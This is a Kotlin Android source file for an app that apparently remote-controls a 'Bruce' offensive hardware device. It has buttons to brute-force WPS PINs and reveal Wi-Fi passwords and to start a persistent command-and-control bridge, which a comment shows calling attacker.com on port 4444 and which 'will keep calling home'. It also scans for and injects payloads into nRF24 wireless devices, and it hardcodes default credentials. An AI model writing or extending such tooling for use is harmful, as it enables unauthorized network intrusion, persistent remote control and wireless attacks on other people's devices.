package com.example.bruceir

import android.os.Bundle
import android.widget.*
import androidx.appcompat.app.AppCompatActivity

class AdvancedActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_advanced)

        val prefs = getSharedPreferences("settings", MODE_PRIVATE)
        val baseUrl = prefs.getString("bruce_url", "http://bruce.local") ?: "http://bruce.local"
        val user = prefs.getString("bruce_user", "admin") ?: "admin"
        val pass = prefs.getString("bruce_pass", "bruce") ?: "bruce"

        // WPS Section
        findViewById<Button>(R.id.btnConnectWps).setOnClickListener {
            val pin = findViewById<EditText>(R.id.etWpsPin).text.toString()
            if (pin.length != 8) {
                Toast.makeText(this, "PIN must be 8 digits", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            Thread {
                // Endpoint firmware: /wifi/wps?pin=12345678
                val url = "$baseUrl/wifi/wps?pin=$pin"
                val response = BruceUtils.downloadFileContent(url, user, pass)
                runOnUiThread {
                    if (response != null && response.contains("password")) {
                        AlertDialog.Builder(this)
                            .setTitle("WPS Success!")
                            .setMessage("Network Data: $response")
                            .setPositiveButton("OK", null)
                            .show()
                    } else {
                        Toast.makeText(this, "WPS Attempt Started (check device display)", Toast.LENGTH_LONG).show()
                    }
                }
            }.start()
        }

        // C2 Bridge Section
        findViewById<Button>(R.id.btnStartBridge).setOnClickListener {
            val host = findViewById<EditText>(R.id.etC2Host).text.toString()
            val port = findViewById<EditText>(R.id.etC2Port).text.toString()
            val useSocks = findViewById<com.google.android.material.materialswitch.MaterialSwitch>(R.id.swSocksProxy).isChecked
            val persistent = findViewById<com.google.android.material.materialswitch.MaterialSwitch>(R.id.swPersistence).isChecked
            
            if (host.isEmpty() || port.isEmpty()) return@setOnClickListener
            
            Thread {
                // Endpoint firmware: /bridge?host=attacker.com&port=4444&socks=true&persist=true
                val url = "$baseUrl/bridge?host=$host&port=$port&socks=$useSocks&persist=$persistent"
                val result = BruceUtils.downloadFileContent(url, user, pass)
                runOnUiThread {
                    findViewById<TextView>(R.id.tvBridgeStatus).text = "Bridge Status: ${result ?: "Sent"}"
                    Toast.makeText(this, "Persistence Enabled. Bruce will keep calling home.", Toast.LENGTH_SHORT).show()
                }
            }.start()
        }

        // nRF24 Section
        findViewById<Button>(R.id.btnNrfScan).setOnClickListener {
            findViewById<TextView>(R.id.tvNrfResults).text = "Scanning..."
            Thread {
                val url = "$baseUrl/nrf/scan?duration=10"
                val response = BruceUtils.downloadFileContent(url, user, pass)
                runOnUiThread {
                    findViewById<TextView>(R.id.tvNrfResults).text = "Targets Found:\n${response ?: "None detected"}"
                }
            }.start()
        }

        findViewById<Button>(R.id.btnNrfInject).setOnClickListener {
            val payload = findViewById<EditText>(R.id.etNrfPayload).text.toString()
            if (payload.isEmpty()) return@setOnClickListener
            
            Thread {
                val encodedPayload = java.net.URLEncoder.encode(payload, "UTF-8")
                val url = "$baseUrl/nrf/inject?data=$encodedPayload"
                BruceUtils.downloadFileContent(url, user, pass)
                runOnUiThread {
                    Toast.makeText(this, "Injection sequence sent to nRF24", Toast.LENGTH_SHORT).show()
                }
            }.start()
        }
    }
}
